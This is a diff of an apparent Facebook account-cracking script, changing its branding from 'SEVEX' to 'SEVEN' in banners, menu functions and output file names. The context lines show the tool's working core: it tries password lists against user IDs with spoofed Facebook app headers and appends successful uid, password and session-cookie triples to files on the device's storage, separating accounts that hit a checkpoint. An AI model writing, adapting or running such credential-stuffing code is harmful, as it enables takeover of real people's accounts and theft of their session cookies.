@@ -150,7 +150,7 @@ ip = requests.get("https://api.ipify.org").text
 #__________FOLDER MAKE_________#
 
 try:
-    os.mkdir('FAHAD')
+    os.mkdir('SEVEN')
     os.system('mv FAHAD /sdcard')
 except:
     pass
@@ -162,7 +162,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.0001)
-sys.stdout.write('\x1b[1;35m\x1b]2; FAHAD \x07')   
+sys.stdout.write('\x1b[1;35m\x1b]2; SEVEN \x07')   
 
 def clear():
 	os.system('clear')	
@@ -219,7 +219,7 @@ else:
     tag = "AM"
     
 #_________MAIN MENU_________#
-def SEVEX():
+def SEVEN():
     try:
                 clear()        
                 x = ("***")
@@ -243,7 +243,7 @@ def SEVEX():
                                 except FileNotFoundError:
                                         print('\033[0;97m[•]\x1b[1;91m FILE LOCATION NOT FOUND')
                                         time.sleep(1)
-                                        SEVEX()
+                                        SEVEN()
                                 clear()
                                 print("\x1b[38;5;8m  [\033[1;32m×\x1b[38;5;8m] \033[1;37mCHOOSE METHOD 4")
                                 line()
@@ -305,7 +305,7 @@ def SEVEX():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 line()
                                 input(' Press enter to back ')
-                                os.system('python sevex.py')                       
+                                os.system('python sevenpro.py')                       
                         elif xd in ['2','02']:
                                 clear()
                                 file_path = input("\x1b[38;5;8m  [\033[1;32m1\x1b[38;5;8m] \033[1;37mYOUR FILE NAME \x1b[38;5;8m: \033[1;37m ")
@@ -318,14 +318,14 @@ def SEVEX():
                                 print(f" \033[1;32m IDS SAVE IN {file_path} \033[0m")
                                 line()
                                 input(" Press enter to go back ")
-                                os.system('python sevex.py')
+                                os.system('python sevenpro.py')
                         elif xd in ['3','03']:
                                 clear()
                                 print(' UNDER MAINTENANCE')
-                                os.system('python sevex.py')
+                                os.system('python sevenpro.py')
                         elif xd in ['0','00']:
                                 clear()
-                                print('  ⪼THANK YOU FOR USING AVI TOOL !!! ')
+                                print('  ⪼THANK YOU FOR USING SEVEN TOOL !!! ')
                                 exit()
                         
                         
@@ -337,7 +337,7 @@ def SEVEX():
 def api1(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mSEVEX M1\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mSEVEN M1\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -358,13 +358,13 @@ def api1(ids,names,passlist):
 				print('\r\r\033[1;32m ╭─\033[38;5;8m[\033[1;32mFB LINK:\033[38;5;8m] \033[1;33mhttps://www.facebook.com/'+uid+'\033[38;5;8m')
 				print('\r\r\033[1;32m ╰─\033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
 				#cek_apk(session,coki)
-				open('/sdcard/SEVEXm1-OK.txt','a').write(uid+' | '+pas+' | '+cookies+'\n')
+				open('/sdcard/SEVENm1-OK.txt','a').write(uid+' | '+pas+' | '+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SEVEX-CP] '+uid+' | '+pas+' \033[1;97m\n')
-				open('/sdcard/SEVEXm1-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [SEVEN-CP] '+uid+' | '+pas+' \033[1;97m\n')
+				open('/sdcard/SEVENm1-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -379,7 +379,7 @@ def api1(ids,names,passlist):
 def newidx(ids,names,passlist):
 	try:
 		global ok,loop,sim_id
-		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mSEVEX M4\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\x1b[38;5;8m [\033[1;32mSEVEN M4\x1b[38;5;8m] \033[1;37m%s   \x1b[38;5;8mOK:- \033[1;32m%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		fn = names.split(' ')[0]
 		try:
 			ln = names.split(' ')[1]
@@ -396,7 +396,7 @@ def newidx(ids,names,passlist):
             'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
             'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
             'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
-            'X-FB-Connection-Type': 'SEVEX',
+            'X-FB-Connection-Type': 'SEVEN',
             'Content-Type': 'application/x-www-form-urlencoded',
             'X-FB-HTTP-Engine': 'Liger'}
 			data={'adid': str(uuid.uuid4()),
@@ -425,14 +425,14 @@ def newidx(ids,names,passlist):
 				print('\r\r\033[1;32m - \033[38;5;8m[\033[1;32mFB LINK:\033[38;5;8m] \033[1;33mhttps://www.facebook.com/'+uid+'\033[38;5;8m')
 				print('\r\r\033[1;32m - \033[38;5;8m[\033[1;32mCOOKIE:\033[38;5;8m] \033[1;39m'+cookies+'\033[1;32m\n')
 				#cek_apk(session,coki)
-				open('/sdcard/SEVEXm4-OK.txt','a').write(uid+' | '+pas+'\n')
-				open('/sdcard/SEVEXm4-COOKIES.txt','a').write(uid+' | '+pas+' ==>> '+cookies+'\n')
+				open('/sdcard/SEVENm4-OK.txt','a').write(uid+' | '+pas+'\n')
+				open('/sdcard/SEVENm4-COOKIES.txt','a').write(uid+' | '+pas+' ==>> '+cookies+'\n')
 				oks.append(uid)
 				break
 			elif 'www.facebook.com' in po['error']['message']:
 				uid = str(po['error']['error_data']['uid'])
-				#print(f'\r\r\033[1;33m [SEVEX-CP] '+uid+' | '+pas+' \033[1;97m\n')
-				open('/sdcard/SEVEXm4-CP.txt','a').write(uid+'|'+pas+'\n')
+				#print(f'\r\r\033[1;33m [SEVEN-CP] '+uid+' | '+pas+' \033[1;97m\n')
+				open('/sdcard/SEVENm4-CP.txt','a').write(uid+'|'+pas+'\n')
 				cps.append(uid)
 				break
 			else:
@@ -442,4 +442,4 @@ def newidx(ids,names,passlist):
 		time.sleep(20)
 	except Exception as e:
 		pass
-SEVEX()
+SEVEN()
